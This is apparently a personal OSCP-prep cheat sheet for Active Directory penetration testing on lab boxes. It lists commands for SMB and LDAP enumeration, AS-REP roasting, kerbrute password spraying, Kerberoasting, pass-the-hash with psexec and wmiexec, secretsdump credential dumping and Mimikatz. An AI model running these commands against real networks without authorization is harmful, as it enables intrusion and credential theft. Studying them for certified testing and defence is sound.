# Active Directory Resources
## XMind
Great resource for a logical flow of what to do with various conditions based on access, position, information, etc.

For the OSCP, I used this resource, which is no longer on the interwebs: https://web.archive.org/web/20220607072235/https://www.xmind.net/m/5dypm8/#
But the XMind file (`Pentesting_Active_directory.xmind`) file is in the `enum` directory to view with XMind thick client.


## Good IPpsec Videos/Other Resources
Good videos and HTB/Vulnhub boxes to review
- Active
- Blackfield
- Kerbrute
- Impacket - GetNPUsers.py
    - rpcclient to set the users password
    - secretsdump.py - with NTDS
    - psexec.py
    - wmiexec.py - (Doesn't drop you to system)

### Injecting Kerberos Tickets into Linux
https://0xeb-bp.com/blog/2019/11/21/practical-guide-pass-the-ticket.html

Sources
https://musyokaian.medium.com/vulnnet-roasted-tryhackme-walkthrough-a239fb05d032

# AD Enumeration
This list is far from exhaustive, and a tad bit disorganized, as I collected these commands during my OSCP prep. There is both overlap and some gaps between the commands listed in the XMind content and the content below.
## Initial Foothold
- Try to enumerate OS version by nmap scan - look at DNS version
- Add hostnames to `/etc/hosts`
- do `nslookup` (set server DC.IP.AD.DR; try your own loopback (127.0.0.1 for accuracy (should get localhost), then try DNS server) )
- if get timeout, do dnsrecon
    - `dnsrecon -d 10.10.10.100 -r 10.0.0.0/8`

### List SMB Shares/Files
- `smbclient -N -L //10.10.10.01/` - should've already done this from autorecon, but doesn't hurt
- `crackmapexec smb 10.10.10.01 -u guest -p "" --shares` - will show if shares are readable
- `crackmapexec smb 10.10.10.01 -u guest -p "" -M spider_plus` - Spider Shares to see files present 

## Username/SID Enumeration
### RPCClient
Rppclient should've been run by autorecon, but just in case
- `rpcclient -U "" 10.10.10.10` - then `enter` for null password
    - alternatively `rpcclient -U "" -N 10.10.10.10`
- If `rpcclient` session is established: `$> enumdomusers`

### LookupSID
- `lookupsid targetdomain.local/guest@10.10.10.10`
- lots of output, can find usernames by grep -i user

### Other Impacket Goodies
- `GetNPUsers.py targetdomain.local/ -no-pass -usersfile users.txt -dc-ip`
- find users that are SREP-roastable, aka user doesn't require creds to request TGT from KDCstrong text

### Download Files Via SMB
Can download file found on smb share with `smbmap -R SHARENAME -H IP.ADDR.0.0 -A Filename -q`
-R = recursive
-H host
-A - Define a file name pattern (regex) that auto downloads a file on a match (requires -R or -r), not case sensitive, ex '(web|global).(asax|config)'
- Can recursively get files with smbclient `smbclient //10.10.10.100/Replication`, and the following commands (mind your local directory before executing):
    - `recurse ON`
    - `prompt OFF`
    - `mget *`

### Ldap Enumeration
- `ldapsearch -x -h 10.10.10.10 -b base namingcontext`
    - if there is an error message of a successful bind must be completed on the connection, then anonymous access to LDAP is disabled

### Password Crack
- GPP Decrypt (gpp-decrypt) to decrypt Group Policy Preferences String

## Enumerate Creds/Username
### Username Mutation
1. Username Mutation Tool: https://github.com/PinkDraconian/CTF-bash-tools
    - `ctf-wordlist-names.sh names-file`
    - script outputs content to: `formatted_name_wordlist.txt`
2. Add usernames like `Administrator` and `guest`
3. Take usernames and then use `kerbrute`
- `kerbrute userenum -d domain.local --dc 10.10.10.01 formatted_name_wordlist.txt --downgrade`
- Password Spray with kerbrute: `kerbrute passwordspray -d domain.local -dc 10.10.10.01 formatted_name_wordlist.txt 'Winter2020!'`

### If you Have Creds
- `GetADUsers.py (part of impacket) - GetADUsers.py -all active.htb/svc_tgs -dc ip 10.10.10.100`
- Impacket PSexec command if you have credentials: `psexec.py active.htb/svc_tgs@10.10.10.100`
- Revisit `smbmap` with `-u`, `-d`, and `-p` flags
- `GetUsersSPNs.py - GetUsersSPNs.py -request -dc-ip IP AD active.ht/svc_tgs:pwd`

### CME (Crackmap Exec)
- PW Authentication: `crackmapexec smb 10.10.10.10 -u username -p "password"`
- List Shares: `crackmapexec smb 10.10.10.10 -u username -p "password" --shares`

### Impacket (w/Creds)
- All commands below allow -hashes flag to specify a NTLM hash
    - `psexec domain/username@10.10.10.10`
    - `wmiexec domain/username@10.10.10.10`
    - `wmiexec domain/username@10.10.10.10 -hashes`
- If user is in Admin group, can dump entire SAM database: `secretsdump domain/username@10.10.10.10`

### If you need Access
- Have you tried psexec.py with your credentials?

### Bloodhound Tip/Windows Tip
- `runas /netonly /user:active.htb\svc_tgs cmd`
    - Then prompted for password
    - Will launch new cmd

### Mimikatz Tips
- Make sure to run version 2.1 and newest version
- `Invoke-Mimikatz`
- `Invoke-Kerberoast`